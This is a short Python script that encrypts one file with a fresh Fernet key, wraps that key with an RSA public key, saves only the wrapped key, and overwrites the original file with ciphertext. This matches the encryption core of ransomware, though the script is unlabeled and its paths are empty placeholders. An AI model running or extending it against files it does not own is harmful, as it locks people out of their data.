from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

symmetricKey = Fernet.generate_key()

FernetInstance = Fernet(symmetricKey)

#INSERT PUBLIC KEY FILE HERE
public_key_file = ""


with open(public_key_file, "rb") as key_file:
	public_key = serialization.load_pem_public_key(
		key_file.read(),
		backend = default_backend()
	)

encryptedSymmetricKey = public_key.encrypt(
	symmetricKey,
	padding.OAEP(
		mgf=padding.MGF1(algorithm=hashes.SHA256()),
		algorithm = hashes.SHA256(),
		label = None
	)
)

with open("encryptedSymmetricKey.key","wb") as key_file:
	key_file.write(encryptedSymmetricKey)


#INSERT FILE TO ENCRPYT HERE
filePath = ""

with open(filePath, "rb") as file:
	file_data = file.read()
	encrypted_data = FernetInstance.encrypt(file_data)
	
with open(filePath, "wb") as file:
	file.write(encrypted_data)
quit()
